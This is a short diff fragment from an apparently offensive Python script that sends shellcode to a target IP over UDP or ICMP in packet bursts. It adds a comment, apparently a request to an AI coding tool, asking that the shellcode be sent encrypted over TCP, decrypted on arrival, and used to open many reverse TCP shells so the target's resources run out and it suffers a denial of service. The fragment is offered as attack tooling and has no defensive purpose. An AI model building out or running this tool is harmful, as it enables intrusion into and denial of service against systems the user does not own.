@@ -75,3 +75,5 @@ if __name__ == "__main__":
                 send_shellcode_via_udp(shellcode, args.target_ip, args.target_port, args.num_packets, args.burst_interval)
         elif args.protocol == 'icmp':
             send_shellcode_via_icmp(shellcode, args.target_ip, args.num_packets, args.burst_interval)
+
+#Yes. Make it so that the shellcode will be sent via the tcp protocol, encrypted, and then once it reaches its intended target will decrypt and then exploit the target with many reverce tcp shells, thus exhausting the target's resources and achiving DoS.
